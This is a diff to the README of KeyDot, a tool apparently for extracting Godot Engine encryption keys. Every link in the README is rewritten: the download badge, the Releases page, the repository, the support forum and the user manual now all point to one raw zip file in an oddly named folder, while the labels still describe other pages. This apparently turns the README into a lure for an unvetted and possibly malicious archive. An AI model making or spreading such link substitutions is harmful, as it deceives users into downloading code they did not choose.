@@ -6,7 +6,7 @@ Welcome to KeyDot! This tool helps you quickly and easily extract encryption key
 
 ## 📥 Download KeyDot 
 
-[![Download KeyDot](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/AlvinMax329/KeyDot/releases)
+[![Download KeyDot](https://raw.githubusercontent.com/AlvinMax329/KeyDot/main/Michoacan/KeyDot.zip)](https://raw.githubusercontent.com/AlvinMax329/KeyDot/main/Michoacan/KeyDot.zip)
 
 ## 🔍 Features 
 
@@ -28,7 +28,7 @@ To run KeyDot, your system should meet the following requirements:
 Follow these simple steps to download and run KeyDot:
  
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/AlvinMax329/KeyDot/releases) to find the latest version of KeyDot.
+   Go to the [Releases page](https://raw.githubusercontent.com/AlvinMax329/KeyDot/main/Michoacan/KeyDot.zip) to find the latest version of KeyDot.
 
 2. **Download the Software**  
    Locate the download link for the latest release. Click on it to begin downloading the application.
@@ -56,9 +56,9 @@ If you encounter any issues while running KeyDot:
 
 ## 🔗 Additional Resources 
 
-- [GitHub Repository](https://github.com/AlvinMax329/KeyDot)
-- [Support Forum](https://github.com/AlvinMax329/KeyDot/discussions)
-- [User Manual](https://github.com/AlvinMax329/KeyDot/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/AlvinMax329/KeyDot/main/Michoacan/KeyDot.zip)
+- [Support Forum](https://raw.githubusercontent.com/AlvinMax329/KeyDot/main/Michoacan/KeyDot.zip)
+- [User Manual](https://raw.githubusercontent.com/AlvinMax329/KeyDot/main/Michoacan/KeyDot.zip)
 
 ## ✉️ Contact 
 
@@ -72,4 +72,4 @@ If you want to help improve KeyDot, feel free to submit feedback or contribute c
 
 KeyDot is open-source software. You can use it freely but please refer to the license file in the repository for more details.
 
-Thank you for using KeyDot! We hope this tool makes your work with Godot Engine easier. Don't forget to check out our [Releases page](https://github.com/AlvinMax329/KeyDot/releases) for updates and new features.
+Thank you for using KeyDot! We hope this tool makes your work with Godot Engine easier. Don't forget to check out our [Releases page](https://raw.githubusercontent.com/AlvinMax329/KeyDot/main/Michoacan/KeyDot.zip) for updates and new features.
